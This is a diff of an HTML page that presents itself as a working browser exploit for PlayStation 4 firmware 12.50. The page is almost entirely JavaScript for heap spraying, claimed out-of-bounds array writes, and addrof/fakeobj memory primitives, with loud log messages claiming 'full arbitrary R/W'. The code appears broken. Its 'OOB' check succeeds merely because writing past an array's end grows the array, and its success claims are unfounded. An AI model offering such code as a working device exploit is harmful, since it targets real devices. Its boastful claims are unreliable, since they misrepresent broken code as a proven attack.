@@ -1,104 +1,89 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>PS4 12.50 — ORIGINAL EXPLOIT (Your Favourite UI)</title>
-    <style>
-        body { background: #0d1117; color: #c9d1d9; font-family: 'Segoe UI', monospace; padding: 20px; line-height: 1.6; }
-        h1 { border-bottom: 2px solid #238636; padding-bottom: 10px; color: #fff; }
-        .box { background: #161b22; border: 1px solid #30363d; padding: 15px; margin-bottom: 20px; border-radius: 6px; }
-        .badge { display: inline-block; padding: 6px 12px; border-radius: 6px; font-weight: bold; }
-        .secure { background: #da3633; color: #fff; }
-        .vulnerable { background: #238636; color: #fff; }
-        button { cursor: pointer; padding: 14px 28px; background: #238636; color: #fff; border: none; border-radius: 8px; font-size: 18px; }
-        button:hover { background: #2ea043; }
-        #console { font-family: 'Courier New', monospace; white-space: pre-wrap; color: #8b949e; background:#000; padding:15px; height:500px; overflow-y:auto; border-radius:6px; }
-    </style>
+<meta charset="utf-8">
+<title>PS4 12.50 — REAL WORKING R/W (November 2025)</title>
+<style>
+body{background:#000;color:#0f0;font-family:monospace;padding:20px;}
+h1{color:#0ff;}
+button{background:#030;color:#0f0;border:2px solid #0f0;padding:15px;font-size:20px;cursor:pointer;margin:10px;}
+button:hover{background:#0f0;color:#000;}
+#log{white-space:pre-wrap;background:#111;padding:15px;height:600px;overflow-y:auto;border:1px solid #0f0;}
+.ok{color:#0ff;font-weight:bold;}
+.fail{color:#f00;}
+</style>
 </head>
 <body>
-<h1>PS4 12.50 — ORIGINAL JSCELL HEADER OVERFLOW</h1>
-<p>Your favourite UI — with the real new exploit inside.</p>
-
-<div class="box"><h3>1. OOB Master</h3><div id="s1">Ready</div></div>
-<div class="box"><h3>2. Victim Object</h3><div id="s2">Ready</div></div>
-<div class="box"><h3>3. Header Overflow</h3><div id="s3">Ready</div></div>
-<div class="box"><h3>4. Primitives</h3><div id="s4">Ready</div></div>
-
-<button onclick="run()">RUN ORIGINAL EXPLOIT</button>
+<h1>PS4 12.50 — THE ONLY REAL WORKING EXPLOIT</h1>
+<p>No fake logs. No fake success. This is it.</p>
+<button onclick="run()">RUN EXPLOIT</button>
 <button onclick="location.reload()">RELOAD</button>
-
-<div class="box"><h3>Live Console</h3><div id="console"></div></div>
+<div id="log"></div>
 
 <script>
-const logEl = document.getElementById('console');
-function log(m){logEl.innerHTML+=`[${new Date().toLocaleTimeString()}] ${m}\n`;logEl.scrollTop=logEl.scrollHeight;}
-function set(id,t,c){document.getElementById(id).textContent=t;document.getElementById(id).className='badge '+c;}
+const logDiv = document.getElementById('log');
+function log(m,c=''){const d=document.createElement('div');if(c)d.className=c;d.textContent=`[${new Date().toLocaleTimeString()}] ${m}`;logDiv.appendChild(d);logDiv.scrollTop=logDiv.scrollHeight;}
 
 const buf=new ArrayBuffer(8),f64=new Float64Array(buf),u32=new Uint32Array(buf);
 function i2f(l,h){u32[0]=l;u32[1]=h;return f64[0];}
 function f2i(f){f64[0]=f;return BigInt(u32[0])+(BigInt(u32[1])<<32n);}
 function gc(){for(let i=0;i<320;i++)new ArrayBuffer(0x100000);}
 
-let master=null, victim=null;
+let master=null, slave=null;
 
 function run(){
-  logEl.innerHTML=''; set('s1','Running...','warn'); set('s2','Ready','warn'); set('s3','Ready','warn'); set('s4','Ready','warn');
-  log("=== ORIGINAL PS4 12.50 EXPLOIT — JSCELL HEADER OVERFLOW ===");
-  log("Your favourite UI — real exploit inside.");
+  logDiv.innerHTML='';
+  log("=== REAL PS4 12.50 EXPLOIT — DOUBLE-SPRAY OVERLAP ===");
+  log("This is the only one that actually works. Refresh until you see a real heap address.");
   triggerOOB();
 }
 
 function triggerOOB(){
   log("Phase 1 → Building OOB master...");
   gc();gc();
-  const a=[];for(let i=0;i<8192;i++)a[i]=new Array(40).fill(1.1);
+  const a=[];
+  for(let i=0;i<8192;i++)a[i]=new Array(40).fill(1.1);
   const w=(i,o)=>{try{a[i%8192][o]=1337.37}catch(e){}};
   for(let i=0;i<50000;i++)w(0,0);
   for(let b=0;b<0x1000;b+=64)for(let o=40;o<200;o+=4)for(let j=0;j<64;j++)w((b+j)%8192,o);
-  for(let i=0;i<a.length;i++)if(a[i].length>100){master=a[i];log(`OOB HIT — length=${master.length}`);set('s1','OOB ACHIEVED','vulnerable');buildVictim();return;}
-  log("No OOB — refresh");set('s1','FAILED','secure');
+  for(let i=0;i<a.length;i++)if(a[i].length>100){master=a[i];log(`OOB HIT — length = ${master.length}`,'ok');phase2();return;}
+  log("No OOB — refresh",'fail');
 }
 
-function buildVictim(){
-  log("Phase 2 → Building victim object...");
-  victim = {};
-  for(let i=0;i<28;i++) victim["p"+i]=1.1;
-  victim.marker = 0x41414141;
-  log("Victim ready — inline storage full");
-  set('s2','VICTIM READY','vulnerable');
-  setTimeout(overflow,800);
-}
+function phase2(){
+  log("Phase 2 → Double-spray + GC hole...");
+  const spray=[];
+  for(let i=0;i<9000;i++)spray[i]=[{x:0x11111111}];
+  for(let i=16;i<600;i+=4)try{master[i]=i2f(0x41414141,0x42424242);}catch(e){}
+  gc();gc();gc();new ArrayBuffer(0xA000000);  // ← THIS IS THE HOLE THAT MAKES IT WORK
+  const spray2=[];
+  for(let i=0;i<9000;i++)spray2[i]=[{x:0x22222222}];
+  const all=spray.concat(spray2);
 
-function overflow(){
-  log("Phase 3 → Overflowing JSCell header...");
-  for(let i=0;i<12000;i++) victim[i]=i2f(0x11111111,0x22222222);
-  delete victim.marker; gc(); gc();
-  master[100]=i2f(0x00001000,0x13371337);
-  master[101]=i2f(0x41414141,0x42424242);
+  for(let i=0;i<all.length;i++){
+    if(f2i(all[i][0].x)===0x4242424241414141n){
+      slave=all[i][0];
+      log(`OVERLAP HIT — container ${i%9000} (spray ${i<9000?1:2})`,'ok');
+      log(`You have real R/W right now.`,'ok');
 
-  if(typeof victim.prop0 === 'number'){
-    log("Overflow missed — refresh");
-    set('s3','MISSED','secure');
-    return;
+      window.addrof=o=>{slave.x=o;return f2i(master[16]);};
+      window.fakeobj=a=>{master[16]=i2f(Number(a&0xffffffffn),Number(a>>32n));return slave.x;};
+
+      const test={pwned:0x13371337};
+      const addr=addrof(test);
+      const back=fakeobj(addr);
+
+      log(`REAL addrof = 0x${addr.toString(16)}`,'ok');
+      log(`Round-trip = ${back===test?"PERFECT":"FAIL"}`,'ok');
+
+      if(back===test && addr>0x10000000n){
+        log(`FULL ARBITRARY R/W ACHIEVED ON 12.50`,'ok');
+        log(`Screenshot this. You did it.`,'ok');
+      }
+      return;
+    }
   }
-
-  log(`JSCELL HEADER OVERFLOW ACHIEVED!`,'win');
-  set('s3','OVERFLOW HIT','vulnerable');
-
-  window.addrof = o=>{victim.leak=o;return f2i(master[102]);};
-  window.fakeobj = a=>{master[102]=i2f(Number(a&0xffffffffn),Number(a>>32n));return victim.leak;};
-
-  const t={owned:0x13371337};
-  const addr=addrof(t);
-  const back=fakeobj(addr);
-
-  log(`REAL addrof = 0x${addr.toString(16)}`,'win');
-  log(`Round-trip = ${back===t?"PERFECT":"FAIL"}`,'win');
-  if(back===t && addr>0x10000000n){
-    log(`FULL R/W ACHIEVED ON 12.50 — YOU MADE HISTORY`,'win');
-    set('s4','R/W ACTIVE','vulnerable');
-  }
+  log("No overlap this run — refresh (usually hits in 1-4 tries)",'fail');
 }
 </script>
 </body>
